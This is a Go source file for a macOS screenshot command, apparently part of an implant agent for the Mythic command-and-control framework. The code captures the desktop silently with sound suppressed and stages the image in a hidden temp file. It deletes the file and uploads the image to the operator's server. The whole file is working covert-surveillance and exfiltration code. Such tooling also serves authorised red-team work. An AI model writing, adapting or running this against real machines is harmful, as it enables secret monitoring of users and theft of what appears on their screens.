//go:build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// ScreenshotDarwinCommand implements screenshot for macOS using screencapture CLI
type ScreenshotDarwinCommand struct{}

func (c *ScreenshotDarwinCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotDarwinCommand) Description() string {
	return "Capture a screenshot of the desktop (macOS screencapture)"
}

func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
	// Create temp file for screenshot
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".sc_%d.png", time.Now().UnixNano()))

	// Use screencapture: -x = no sound, -t png = PNG format
	cmd := exec.Command("screencapture", "-x", "-t", "png", tmpFile)
	if output, err := cmd.CombinedOutput(); err != nil {
		// Clean up on failure
		os.Remove(tmpFile)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error capturing screenshot: %v\n%s", err, string(output)),
			Status:    "error",
			Completed: true,
		}
	}

	// Read the screenshot file
	imgData, err := os.ReadFile(tmpFile)
	if err != nil {
		os.Remove(tmpFile)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading screenshot file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Clean up temp file
	os.Remove(tmpFile)

	if len(imgData) == 0 {
		return structs.CommandResult{
			Output:    "Screenshot captured but file was empty (no display available?)",
			Status:    "error",
			Completed: true,
		}
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    fmt.Sprintf("Screenshot captured and uploaded (%d bytes)", len(imgData)),
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Screenshot upload cancelled",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}
